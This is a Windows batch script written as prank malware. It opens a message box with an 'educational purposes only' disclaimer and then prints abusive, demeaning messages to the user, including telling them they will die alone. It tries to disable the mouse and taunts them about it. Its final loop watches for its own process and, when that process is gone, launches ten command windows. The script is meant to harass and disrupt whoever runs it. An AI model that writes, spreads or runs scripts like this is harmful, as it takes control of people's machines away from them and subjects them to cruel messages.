@echo off
echo x=msgbox("All files here are to be used for educational purposes only. Use all files as is; any modifications in any way immediatly deem them as no longer our responsibility. Any lawful action taken against individuals or an organization from use/distribution of these files is not our responsibility regardless of files edits or lack thereof (after posted publish date)." ,16, "WARNING") >> msgbox.vbs
start msgbox.vbs
echo hi.
timeout /t 2 /nobreak
echo no one loves you an you are going to die alone.
timeout /t 2 /nobreak
echo are u single?
timeout /t 2 /nobreak
echo i can tell.
timeout /t 2 /nobreak
echo i hate looking at you.
timeout /t 2 /nobreak
echo you know what i hate it so much you dont get a mouse anymore.
rundll32.exe mouse, disable
timeout /t 2 /nobreak
echo dont worry u will get it back eventually.
timeout /t 2 /nobreak
echo btw if u close this just remember that i dont die that easy.
timeout /t 2 /nobreak
echo you know what ur a loser im done talking to you but i wouldnt recommend closing this window just yet 
timeout /t 2 /nobreak
echo oh wait i forgot u have no mouse to close the window.
timeout /t 2 /nobreak
echo here u go im feeling nice today
rundll32.exe mouse, enable
timeout /t 6000
:start
tasklist /v | Find "justwhy.bat"
if "%ERRORLEVEL%"=="1" (
  START cmd.exe
  START cmd.exe
  START cmd.exe
  START cmd.exe
  START cmd.exe
  START cmd.exe
  START cmd.exe
  START cmd.exe
  START cmd.exe
  START cmd.exe
  exit
)
timeout /t 1 /NOBREAK >nul
goto :start
